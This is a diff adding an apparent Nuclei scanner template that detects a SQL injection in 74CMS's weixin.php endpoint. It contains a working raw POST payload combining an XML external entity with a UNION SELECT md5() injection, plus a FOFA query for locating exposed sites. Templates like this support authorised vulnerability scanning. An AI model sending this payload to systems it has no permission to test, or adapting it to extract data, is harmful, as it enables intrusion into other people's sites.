@@ -1,0 +1,43 @@
+id: 74cms-weixin-sqli
+
+info:
+  name: 74CMS weixin.php - SQL Injection
+  author: SleepingBag945
+  severity: high
+  description: |
+    There is a libxml_disable_entity_loader function to prevent XML eXternal Entity Injection, but this function needs to be customized by the user. If the user does not customize it, there will be no filtering, which leads to SQL injection vulnerabilities.
+  reference:
+    - https://cn-sec.com/archives/25900.html
+  classification:
+    cpe: cpe:2.3:a:74cms:74cms:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="骑士-74CMS"
+    product: 74cms
+    vendor: 74cms
+  tags: 74cms,weixin,sqli
+
+variables:
+  num: '999999999'
+
+http:
+  - raw:
+      - |
+        POST /plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709&timestamp=&nonce= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <?xml version="1.0" encoding="utf-8"?><!DOCTYPE copyright [<!ENTITY test SYSTEM "file:///">]><xml><ToUserName>&test;</ToUserName><FromUserName>1111</FromUserName><MsgType>123</MsgType><FuncFlag>3</FuncFlag><Content>1%' union select md5({{num}})#</Content></xml>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{md5(num)}}'
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a00473045022100adb8b3e28c7c41427ce229d199d5b179c9a2af1871f9de53e7b6bdf157036d93022055c06e0f2c30140f5da28bc96c9c78db6f1238695c61aa266714ce7b5fda139c:922c64590222798bb761d5b6d8e72950
